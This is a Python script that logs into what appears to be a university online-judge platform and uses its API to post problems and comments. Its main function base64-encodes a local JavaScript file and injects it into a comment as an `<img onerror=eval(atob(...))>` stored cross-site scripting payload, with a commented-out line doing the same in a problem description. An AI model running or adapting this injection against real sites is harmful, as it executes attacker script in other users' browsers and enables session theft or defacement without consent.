import requests
import json
import base64
DOMAIN = "https://pyshare.noj.tw"

def login(username:str, password:str)->requests.Session:
    url = f"{DOMAIN}/api/auth/session"
    sess = requests.session()
    with sess.post(url, json={
        "password":password,
        "school":"NTNU",
        "username":username
    }) as resp:
        if resp.status_code != 200:
            return None
    return sess

def create_problem(
    sess:requests.Session,
    title:str,
    description:str,
    course_id:str):
    url = f"{DOMAIN}/api/problem"
    with sess.post(url, json={
        "title":title,
        "description":description,
        "tags":[],
        "status":1,
        "attachments":[],
        "defaultCode":"",
        "isTemplate":False,
        "allowMultipleComments":True,
        "course":course_id
    }) as resp:
        if resp.status_code == 200:
            return json.loads(resp.text)['data']['pid']
    return -1

def create_comment(
    sess:requests.Session,
    pid:int,
    title:str,
    content:str,
    code = "print('a')"
    ):
    url = f"{DOMAIN}/api/comment"
    with sess.post(url, json={
        "target": "problem", 
        "id": pid, 
        "title": title, 
        "content": content, 
        "code": code
    }) as resp:
        if resp.status_code == 200:
            return resp.json()["data"]["id"]
        print(resp.text)
    return None
def delete_comment(
    sess:requests.Session,
    comment_id:str
):
    url = f"{DOMAIN}/api/comment/{comment_id}"
    with sess.delete(url) as resp:
        if resp.status_code != 200:
            raise Exception(f"unable to delete comment {resp.text}")
def create_attachment(
    sess:requests.Session,
    pid:str,
    file:str
):
    url = f"{DOMAIN}/api/problem/{pid}/attachment"
    with sess.post(url, files={
        "attachment":open(file, "rb"),
    },
    data={
        "attachmentName":file
    }) as resp:
        print(resp.text)

def main():
    cred = json.loads(open("cred.json", "r").read())
    sess = login(cred["username"], cred["password"])
    payload = base64.b64encode(open("badscript.js", 'r').read().encode()).decode()
    #print(create_problem(sess, "全師大最大線上LOL雷包分析系統上線了歐~~~(陳兆閔, 林昕鋭)",   f"<img src='' onerror='javascript:eval(atob(\"{payload}\"))'>"+open("index.html", "r", encoding="utf-8").read(), "61676320d15ba0d78625175c"))
    #delete_comment(sess, "61caf493936f0aa9519e28d8")
    print(create_comment(sess, 316, "test touhou", f"<img src='' onerror='javascript:eval(atob(\"{payload}\"))'>"))
    
    #create_attachment(sess, 312, "內容敘述.docx")
if __name__ == "__main__":
    main()
